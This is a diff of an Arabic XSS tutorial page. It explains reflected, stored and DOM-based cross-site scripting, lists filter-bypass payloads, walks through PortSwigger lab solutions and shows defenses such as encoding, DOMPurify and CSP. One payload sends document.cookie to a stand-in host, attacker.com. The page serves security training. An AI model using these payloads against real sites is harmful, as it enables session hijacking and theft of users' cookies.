@@ -167,7 +167,7 @@ sequenceDiagram
     participant W as 🌐 تطبيق الويب الضعيف
     
     A->>A: 1. ينشئ رابطاً خبيثاً
-    Note over A: search.php?query=<script>alert(document.cookie)</script>
+    Note over A: search.php?query=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
     A->>V: 2. يرسل الرابط للضحية (Phishing)
     V->>W: 3. الضحية ينقر الرابط
     W-->>V: 4. التطبيق يعيد Script الخبيث في الاستجابة
@@ -176,12 +176,12 @@ sequenceDiagram
                 </div>
                 
                 <div class="code-block">
-# مثال: محرك بحث ضعيف
-GET /search.php?query=<script>alert('Reflected XSS!');</script> HTTP/1.1
+<span class="code-header"><i class="fas fa-code"></i> مثال: محرك بحث ضعيف</span>
+<pre><code>GET /search.php?query=&lt;script&gt;alert('Reflected XSS!');&lt;/script&gt; HTTP/1.1
 Host: vulnerable-site.com
 
 # الاستجابة (غير آمنة):
-<p>You searched for: <script>alert('Reflected XSS!');</script></p>
+&lt;p&gt;You searched for: &lt;script&gt;alert('Reflected XSS!');&lt;/script&gt;&lt;/p&gt;</code></pre>
                 </div>
                 
                 <div class="tip">
@@ -206,7 +206,7 @@ sequenceDiagram
     participant V as 👤 الضحية
     
     A->>W: 1. يحقن Script خبيث (مثل تعليق)
-    Note over A: <script>alert('Stored XSS!');</script>
+    Note over A: &lt;script&gt;alert('Stored XSS!');&lt;/script&gt;
     W->>DB: 2. يخزن التعليق الخبيث
     DB-->>W: 3. يسترجع التعليق لعرضه
     W-->>V: 4. الضحية يزور الصفحة التي تحتوي على التعليق
@@ -215,14 +215,14 @@ sequenceDiagram
                 </div>
                 
                 <div class="code-block">
-# مثال: نظام تعليقات
-POST /submit_comment HTTP/1.1
+<span class="code-header"><i class="fas fa-code"></i> مثال: نظام تعليقات</span>
+<pre><code>POST /submit_comment HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
 
-comment=Hello!<script>alert(document.cookie)</script>
+comment=Hello!&lt;script&gt;alert(document.cookie)&lt;/script&gt;
 
 # عند زيارة صفحة التعليقات:
-<p>Hello!<script>alert(document.cookie)</script></p>
+&lt;p&gt;Hello!&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;/p&gt;</code></pre>
                 </div>
 
                 <div class="danger">
@@ -246,27 +246,27 @@ sequenceDiagram
     participant B as 🌐 متصفح الضحية
     
     A->>A: 1. ينشئ رابطاً خبيثاً
-    Note over A: site.com/page#name=<script>alert(document.cookie)</script>
+    Note over A: site.com/page#name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
     A->>V: 2. يرسل الرابط للضحية
     V->>B: 3. الضحية يزور الرابط
     Note over B: المتصفح يقرأ fragment part (#)
-    B->>B: 4. JavaScript في الصفحة يقرأ Fragment<br/>ويضيفه لـ DOM بدون تطهير
+    B->>B: 4. JavaScript في الصفحة يقرأ Fragment&lt;br/&gt;ويضيفه لـ DOM بدون تطهير
     B->>B: 5. المتصفح ينفذ Script الخبيث 💥
     B-->>A: 6. معلومات الضحية تُرسل للمهاجم
                 </div>
                 
                 <div class="code-block">
-# مثال: صفحة تقرأ من URL Hash
-// JavaScript في الصفحة
-var user_input = document.location.hash.slice(1); // #name=<script>
+<span class="code-header"><i class="fas fa-code"></i> مثال: صفحة تقرأ من URL Hash</span>
+<pre><code>// JavaScript في الصفحة
+var user_input = document.location.hash.slice(1); // #name=&lt;script&gt;
 document.getElementById('welcome').innerHTML = "Welcome " + user_input;
 
 # الـ payload في URL:
-https://example.com/page#name=<img onerror=alert(1) src=x>
+https://example.com/page#name=&lt;img onerror=alert(1) src=x&gt;
 
 # الكود الناتج في DOM:
-<div id="welcome">Welcome <img onerror=alert(1) src=x></div>
-# alert(1) سيتم تنفيذه
+&lt;div id="welcome"&gt;Welcome &lt;img onerror=alert(1) src=x&gt;&lt;/div&gt;
+# alert(1) سيتم تنفيذه</code></pre>
                 </div>
                 
                 <div class="tip">
@@ -347,59 +347,79 @@ https://example.com/page#name=<img onerror=alert(1) src=x>
 
             <div class="grid">
                 <div class="card">
-                    <h4>الأساسي: استخدام وسم <code>&lt;script&gt;</code></h4>
+                    <h4>الأساسي: استخدام وسم &lt;script&gt;</h4>
                     <div class="code-block">
-&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+<span class="code-header"><i class="fas fa-code"></i> مثال: Payload أساسي</span>
+<pre><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;
 &lt;script&gt;prompt(1)&lt;/script&gt;
 &lt;script&gt;confirm(1)&lt;/script&gt;
-&lt;script&gt;location='//attacker.com/cookie.php?c='+document.cookie&lt;/script&gt;
+&lt;script&gt;location=&#39;//attacker.com/cookie.php?c=&#39;+document.cookie&lt;/script&gt;
+&lt;script&gt;print()&lt;/script&gt;</code></pre>
                     </div>
                 </div>
                 
                 <div class="card">
                     <h4>استخدام سمات الأحداث (Event Attributes)</h4>
                     <div class="code-block">
-&lt;img src=x onerror=alert(1)&gt;
+<span class="code-header"><i class="fas fa-code"></i> مثال: Event Attributes</span>
+<pre><code>&lt;img src=x onerror=alert(1)&gt;
 &lt;body onload=alert(1)&gt;
 &lt;svg onload=alert(1)&gt;&lt;/svg&gt;
-&lt;input type="text" value="" onfocus="alert(1)" autofocus&gt;
+&lt;input type=&#34;text&#34; value=&#34;&#34; onfocus=&#34;alert(1)&#34; autofocus&gt;</code></pre>
                     </div>
                 </div>
                 
                 <div class="card">
                     <h4>استخدام Pseudo-protocols (مخططات URL)</h4>
                     <div class="code-block">
-&lt;a href="javascript:alert(1)"&gt;Click Me&lt;/a&gt;
-&lt;iframe src="javascript:alert(1)"&gt;&lt;/iframe&gt;
-&lt;img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+"&gt;
+<span class="code-header"><i class="fas fa-code"></i> مثال: Pseudo-protocols</span>
+<pre><code>&lt;a href=&#34;javascript:alert(1)&#34;&gt;Click Me&lt;/a&gt;
+&lt;iframe src=&#34;javascript:alert(1)&#34;&gt;&lt;/iframe&gt;
+&lt;img src=&#34;data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+&#34;&gt;</code></pre>
                     </div>
                 </div>
                 
                 <div class="card">
-                    <h4>استخدام وسم <code>&lt;iframe&gt;</code></h4>
+                    <h4>استخدام وسم &lt;iframe&gt;</h4>
                     <div class="code-block">
-&lt;iframe src="javascript:alert(1)"&gt;&lt;/iframe&gt;
-&lt;iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"&gt;&lt;/iframe&gt;
-&lt;iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&gt;&lt;/iframe&gt;
+<span class="code-header"><i class="fas fa-code"></i> مثال: Iframe Payloads</span>
+<pre><code>&lt;iframe src=&#34;javascript:alert(1)&#34;&gt;&lt;/iframe&gt;
+&lt;iframe srcdoc=&#34;&lt;script&gt;alert(1)&lt;/script&gt;&#34;&gt;&lt;/iframe&gt;
+&lt;iframe src=&#34;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&#34;&gt;&lt;/iframe&gt;</code></pre>
                     </div>
                 </div>
                 
                 <div class="card">
                     <h4>حقن في تعليقات HTML أو CSS</h4>
                     <div class="code-block">
-&lt;!--XSS--&gt;&lt;script&gt;alert(1)&lt;/script&gt;
-&lt;div style="background-image:url(javascript:alert(1))"&gt;
-&lt;style&gt;@import 'javascript:alert(1)';&lt;/style&gt;
+<span class="code-header"><i class="fas fa-code"></i> مثال: HTML/CSS Context</span>
+<pre><code>&lt;!--XSS--&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;div style=&#34;background-image:url(javascript:alert(1))&#34;&gt;
+&lt;style&gt;@import &#39;javascript:alert(1)&#39;;&lt;/style&gt;</code></pre>
                     </div>
                 </div>
                 
                 <div class="card">
                     <h4>تجاوز فلاتر المسافات/التعليقات</h4>
                     <div class="code-block">
-&lt;img/src=x%20onerror=alert(1)&gt;
-&lt;img src=x on<script>alert(1)</script>error=alert(1)&gt;
-&lt;img src=x onerror=/*&lt;svg/onload=alert(1)&gt;*/alert(1)&gt;
+<span class="code-header"><i class="fas fa-code"></i> مثال: Filter Bypass</span>
+<pre><code>&lt;img/src=x%20onerror=alert(1)&gt;
+&lt;img src=x on&lt;script&gt;alert(1)&lt;/script&gt;error=alert(1)&gt;
+&lt;img src=x onerror=/*&lt;svg/onload=alert(1)&gt;*/alert(1)&gt;</code></pre>
                     </div>
+                </div>
+            </div>
+
+            <div class="tip">
+                <h4>💡 استخدام print() بدلاً من alert()</h4>
+                <p>في بعض سيناريوهات XSS، قد يقوم مطورو الويب بحظر أو تصفية الدالة &lt;code&gt;alert()&lt;/code&gt; تحديداً لعرقلة هجمات إثبات المفهوم (Proof of Concept). في هذه الحالات، يمكن للمهاجمين استخدام دوال JavaScript أخرى لها تأثير مرئي للمستخدم، مثل &lt;code&gt;print()&lt;/code&gt; التي تفتح نافذة الطباعة في المتصفح، أو &lt;code&gt;confirm()&lt;/code&gt; أو &lt;code&gt;prompt()&lt;/code&gt;.</p>
+                <p>استخدام &lt;code&gt;print()&lt;/code&gt; يعتبر طريقة فعالة لتجاوز الفلاتر التي تستهدف &lt;code&gt;alert()&lt;/code&gt;، ويثبت للمختبر الأمني أن الكود الخبيث قابل للتنفيذ في متصفح الضحية.</p>
+                <div class="code-block">
+<span class="code-header"><i class="fas fa-code"></i> مثال: استخدام print()</span>
+<pre><code>&lt;script&gt;print()&lt;/script&gt;
+&lt;img src=x onerror=print()&gt;
+&lt;svg onload=print()&gt;&lt;/svg&gt;
+&lt;a href=&#34;javascript:print()&#34;&gt;Click to Print&lt;/a&gt;</code></pre>
                 </div>
             </div>
         </section>
@@ -413,14 +433,15 @@ https://example.com/page#name=<img onerror=alert(1) src=x>
                     <h4>ترميز URL (URL Encoding)</h4>
                     <p>تشفير الأحرف الخاصة لتجاوز الفلاتر التي تبحث عن سلاسل نصية معينة.</p>
                     <div class="code-block">
-&lt;script&gt;alert(1)&lt;/script&gt;
+<span class="code-header"><i class="fas fa-code"></i> مثال: URL Encoding</span>
+<pre><code>&lt;script&gt;alert(1)&lt;/script&gt;
 # تصبح:
 %3Cscript%3Ealert%281%29%3C%2Fscript%3E
 
 # مثال آخر:
 &lt;img src=x onerror=alert(1)&gt;
 # تصبح:
-%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
+%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E</code></pre>
                     </div>
                 </div>
                 
@@ -428,12 +449,13 @@ https://example.com/page#name=<img onerror=alert(1) src=x>
                     <h4>تشفير HTML (HTML Entities)</h4>
                     <p>استخدام كيانات HTML لتمثيل الأحرف الخاصة.</p>
                     <div class="code-block">
-&lt;script&gt;alert(1)&lt;/script&gt;
+<span class="code-header"><i class="fas fa-code"></i> مثال: HTML Entities</span>
+<pre><code>&lt;script&gt;alert(1)&lt;/script&gt;
 # تصبح:
-&amp;lt;script&amp;gt;alert&amp;lpar;1&amp;rpar;&amp;lt;/script&amp;gt;
+&amp;amp;lt;script&amp;amp;gt;alert&amp;amp;lpar;1&amp;amp;rpar;&amp;amp;lt;/script&amp;amp;gt;
 
 # أو بترميز الأرقام:
-&amp;#x3C;script&amp;#x3E;alert&amp;#x28;1&amp;#x29;&amp;#x3C;/script&amp;#x3E;
+&amp;amp;#x3C;script&amp;amp;#x3E;alert&amp;amp;#x28;1&amp;amp;#x29;&amp;amp;#x3C;/script&amp;amp;#x3E;</code></pre>
                     </div>
                 </div>
                 
@@ -441,9 +463,10 @@ https://example.com/page#name=<img onerror=alert(1) src=x>
                     <h4>تجاوز فلاتر المسافات والحروف الكبيرة والصغيرة</h4>
                     <p>بعض الفلاتر حساسة لحالة الأحرف أو تتطلب مسافات معينة.</p>
                     <div class="code-block">
-&lt;IMG SRC=x ONERROR=alert(1)&gt;
+<span class="code-header"><i class="fas fa-code"></i> مثال: Case/Space Bypass</span>
+<pre><code>&lt;IMG SRC=x ONERROR=alert(1)&gt;
 &lt;sCrIpT&gt;alert(1)&lt;/sCrIpT&gt;
-&lt;img/src=x onerror=alert(1)&gt; (استخدام / بدلاً من مسافة)
+&lt;img/src=x onerror=alert(1)&gt; (استخدام / بدلاً من مسافة)</code></pre>
                     </div>
                 </div>
                 
@@ -451,9 +474,10 @@ https://example.com/page#name=<img onerror=alert(1) src=x>
                     <h4>استخدام علامات اقتباس مختلفة</h4>
                     <p>إذا كان الفلتر يمنع علامة اقتباس واحدة، جرب الأخرى.</p>
                     <div class="code-block">
-&lt;img src=x onerror="alert(1)"&gt;
+<span class="code-header"><i class="fas fa-code"></i> مثال: Quote Variations</span>
+<pre><code>&lt;img src=x onerror="alert(1)"&gt;
 &lt;img src=x onerror='alert(1)'&gt;
-&lt;img src=x onerror=`alert(1)`&gt; (backticks في ES6)
+&lt;img src=x onerror=`alert(1)`&gt; (backticks في ES6)</code></pre>
                     </div>
                 </div>
                 
@@ -461,10 +485,11 @@ https://example.com/page#name=<img onerror=alert(1) src=x>
                     <h4>تجاوز الكلمات المحظورة (Blacklisting)</h4>
                     <p>إذا كانت كلمة "script" محظورة، جرب بدائل.</p>
                     <div class="code-block">
-&lt;img src=x onerror=alert`1`&gt; (استخدام backticks بدلاً من أقواس)
+<span class="code-header"><i class="fas fa-code"></i> مثال: Blacklist Bypass</span>
+<pre><code>&lt;img src=x onerror=alert`1`&gt; (استخدام backticks بدلاً من أقواس)
 &lt;img src=x onerror=top['al'+'ert'](1)&gt;
 &lt;img src=x onerror=eval('al'+'ert(1)')&gt;
-&lt;svg/onload=alert(1)&gt;
+&lt;svg/onload=alert(1)&gt;</code></pre>
                     </div>
                 </div>
                 
@@ -472,9 +497,10 @@ https://example.com/page#name=<img onerror=alert(1) src=x>
                     <h4>حقن في سياق CSS</h4>
                     <p>إذا كانت إدخالات المستخدم تظهر في كود CSS.</p>
                     <div class="code-block">
-body { background-image: url("javascript:alert(1)"); }
+<span class="code-header"><i class="fas fa-code"></i> مثال: CSS Context</span>
+<pre><code>body { background-image: url("javascript:alert(1)"); }
 @import "javascript:alert(1)";
-&lt;div style="width: expression(alert(1));"&gt; (IE only)
+&lt;div style="width: expression(alert(1));"&gt; (IE only)</code></pre>
                     </div>
                 </div>
             </div>
@@ -496,12 +522,12 @@ body { background-image: url("javascript:alert(1)"); }
                 <p><strong>الهدف:</strong> حقن XSS في سياق HTML دون أي تشفير.</p>
                 <p><strong>التقنية:</strong> استخدام وسم <code>&lt;script&gt;</code> مباشر.</p>
                 <div class="code-block">
-# خطوات الحل:
-1. ابحث عن نقطة إدخال (Input field) تعكس إدخالك.
+<span class="code-header"><i class="fas fa-code"></i> خطوات الحل</span>
+<pre><code>1. ابحث عن نقطة إدخال (Input field) تعكس إدخالك.
 2. أدخل Payload: &lt;script&gt;alert(document.domain)&lt;/script&gt;
-3. لاحظ تنفيذ الـ JavaScript في المتصفح.
+3. لاحظ تنفيذ الـ JavaScript في المتصفح.</code></pre>
                 </div>
-                <a href="https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-with-nothing-encoded" class="lab-link" target="_blank">
+                <a href="https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded" class="lab-link" target="_blank">
                     <i class="fas fa-external-link-alt"></i> فتح المختبر
                 </a>
             </div>
@@ -511,12 +537,12 @@ body { background-image: url("javascript:alert(1)"); }
                 <p><strong>الهدف:</strong> تجاوز فلتر يحظر معظم الوسوم والسمات.</p>
                 <p><strong>التقنية:</strong> استخدام وسم <code>&lt;img&gt;</code> مع سمة <code>onerror</code>.</p>
                 <div class="code-block">
-# خطوات الحل:
-1. جرب Payload: &lt;script&gt;alert(1)&lt;/script&gt; (سيتم حظره).
+<span class="code-header"><i class="fas fa-code"></i> خطوات الحل</span>
+<pre><code>1. جرب Payload: &lt;script&gt;alert(1)&lt;/script&gt; (سيتم حظره).
 2. جرب Payload: &lt;img src=x onerror=alert(1)&gt;
-3. تأكد من أن الـ payload لا يحتوي على مسافات أو أحرف محظورة.
+3. تأكد من أن الـ payload لا يحتوي على مسافات أو أحرف محظورة.</code></pre>
                 </div>
-                <a href="https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-with-most-tags-and-attributes-blocked" class="lab-link" target="_blank">
+                <a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked" class="lab-link" target="_blank">
                     <i class="fas fa-external-link-alt"></i> فتح المختبر
                 </a>
             </div>
@@ -528,13 +554,13 @@ body { background-image: url("javascript:alert(1)"); }
                 <p><strong>الهدف:</strong> حقن XSS دائمة في سياق HTML.</p>
                 <p><strong>التقنية:</strong> حقن <code>&lt;script&gt;</code> في التعليقات أو المنشورات.</p>
                 <div class="code-block">
-# خطوات الحل:
-1. اذهب إلى صفحة التعليقات أو المنتدى.
+<span class="code-header"><i class="fas fa-code"></i> خطوات الحل</span>
+<pre><code>1. اذهب إلى صفحة التعليقات أو المنتدى.
 2. أضف تعليقاً يحتوي على: &lt;script&gt;alert(document.cookie)&lt;/script&gt;
 3. سجل خروجك ثم سجل دخولك مرة أخرى أو اطلب من مستخدم آخر زيارة الصفحة.
-4. لاحظ سرقة الـ cookie.
+4. لاحظ سرقة الـ cookie.</code></pre>
                 </div>
-                <a href="https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-with-nothing-encoded" class="lab-link" target="_blank">
+                <a href="https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded" class="lab-link" target="_blank">
                     <i class="fas fa-external-link-alt"></i> فتح المختبر
                 </a>
             </div>
@@ -546,12 +572,12 @@ body { background-image: url("javascript:alert(1)"); }
                 <p><strong>الهدف:</strong> استغلال DOM XSS باستخدام <code>document.write</code>.</p>
                 <p><strong>التقنية:</strong> حقن HTML/JavaScript في معلمة URL (query string).</p>
                 <div class="code-block">
-# خطوات الحل:
-1. ابحث عن دالة JavaScript تستخدم <code>location.search</code> أو <code>location.hash</code>.
+<span class="code-header"><i class="fas fa-code"></i> خطوات الحل</span>
+<pre><code>1. ابحث عن دالة JavaScript تستخدم <code>location.search</code> أو <code>location.hash</code>.
 2. أضف Payload: <code>?&lt;img src=x onerror=alert(1)&gt;</code> إلى URL.
-3. تأكد من أن الدالة لا تقوم بتطهير الإدخال.
+3. تأكد من أن الدالة لا تقوم بتطهير الإدخال.</code></pre>
                 </div>
-                <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-using-location-search-source" class="lab-link" target="_blank">
+                <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink" class="lab-link" target="_blank">
                     <i class="fas fa-external-link-alt"></i> فتح المختبر
                 </a>
             </div>
@@ -561,12 +587,12 @@ body { background-image: url("javascript:alert(1)"); }
                 <p><strong>الهدف:</strong> استغلال DOM XSS باستخدام <code>innerHTML</code>.</p>
                 <p><strong>التقنية:</strong> حقن HTML/JavaScript في URL fragment.</p>
                 <div class="code-block">
-# خطوات الحل:
-1. ابحث عن دالة JavaScript تستخدم <code>location.hash</code> وتضعها في <code>innerHTML</code>.
+<span class="code-header"><i class="fas fa-code"></i> خطوات الحل</span>
+<pre><code>1. ابحث عن دالة JavaScript تستخدم <code>location.hash</code> وتضعها في <code>innerHTML</code>.
 2. أضف Payload: <code>#&lt;img src=x onerror=alert(1)&gt;</code> إلى URL.
-3. المتصفح سينفذ الكود عند تحميل الصفحة.
+3. المتصفح سينفذ الكود عند تحميل الصفحة.</code></pre>
                 </div>
-                <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink-using-location-hash-source" class="lab-link" target="_blank">
+                <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink" class="lab-link" target="_blank">
                     <i class="fas fa-external-link-alt"></i> فتح المختبر
                 </a>
             </div>
@@ -597,19 +623,19 @@ body { background-image: url("javascript:alert(1)"); }
                         <li><strong>تطبيق:</strong> استخدم مكتبات التشفير الموثوقة (مثل OWASP ESAPI).</li>
                     </ul>
                     <div class="code-block">
-// كود JavaScript (مثال)
-function encodeHTML(str) {
-    return str.replace(/[&<>"']/g, function (match) {
+<span class="code-header"><i class="fas fa-code"></i> مثال: HTML Encoding في JavaScript</span>
+<pre><code>function encodeHTML(str) {
+    return str.replace(/[&amp;&lt;&gt;"\']/g, function (match) {
         return {
-            '&': '&amp;',
-            '<': '&lt;',
-            '>': '&gt;',
-            '"': '&quot;',
-            "'": '&#039;'
+            '&amp;': '&amp;amp;',
+            '&lt;': '&amp;lt;',
+            '&gt;': '&amp;gt;',
+            '"': '&amp;quot;',
+            "'": '&amp;#039;'
         }[match];
     });
 }
-document.getElementById('output').innerHTML = encodeHTML(user_input);
+document.getElementById('output').innerHTML = encodeHTML(user_input);</code></pre>
                     </div>
                 </div>
                 
@@ -621,10 +647,10 @@ document.getElementById('output').innerHTML = encodeHTML(user_input);
                         <li><strong>تطبيق:</strong> استخدام مكتبات تطهير قوية (مثل DOMPurify في الواجهة الأمامية، أو Jsoup في الخلفية).</li>
                     </ul>
                     <div class="code-block">
-// كود JavaScript (مثال باستخدام DOMPurify)
-import DOMPurify from 'dompurify';
+<span class="code-header"><i class="fas fa-code"></i> مثال: Sanitization باستخدام DOMPurify</span>
+<pre><code>import DOMPurify from 'dompurify';
 const cleanHtml = DOMPurify.sanitize(user_input, { USE_PROFILES: { html: true } });
-document.getElementById('output').innerHTML = cleanHtml;
+document.getElementById('output').innerHTML = cleanHtml;</code></pre>
                     </div>
                 </div>
                 
@@ -636,8 +662,8 @@ document.getElementById('output').innerHTML = cleanHtml;
                         <li><strong>مثال:</strong> <code>Content-Security-Policy: default-src 'self'</code></li>
                     </ul>
                     <div class="code-block">
-# مثال على CSP Header
-Content-Security-Policy: 
+<span class="code-header"><i class="fas fa-code"></i> مثال: CSP Header</span>
+<pre><code>Content-Security-Policy: 
   default-src 'self'; 
   script-src 'self' https://trusted-cdn.com; 
   object-src 'none'; 
@@ -646,7 +672,7 @@ Content-Security-Policy:
 # هذا يمنع:
 - تنفيذ inline scripts ('unsafe-inline')
 - تحميل scripts من مصادر غير موثوقة
-- استخدام eval() و setTimeout() مع سلاسل نصية ('unsafe-eval')
+- استخدام eval() و setTimeout() مع سلاسل نصية ('unsafe-eval')</code></pre>
                     </div>
                 </div>
                 
@@ -667,8 +693,8 @@ Content-Security-Policy:
                         <li><strong>النتيجة:</strong> حتى لو تم حقن XSS، لا يمكن للمهاجم سرقة الـ session cookie.</li>
                     </ul>
                     <div class="code-block">
-# مثال لتعيين HttpOnly Cookie
-Set-Cookie: JSESSIONID=xyz123; HttpOnly; Secure; SameSite=Lax
+<span class="code-header"><i class="fas fa-code"></i> مثال: HttpOnly Cookie</span>
+<pre><code>Set-Cookie: JSESSIONID=xyz123; HttpOnly; Secure; SameSite=Lax</code></pre>
                     </div>
                 </div>
                 
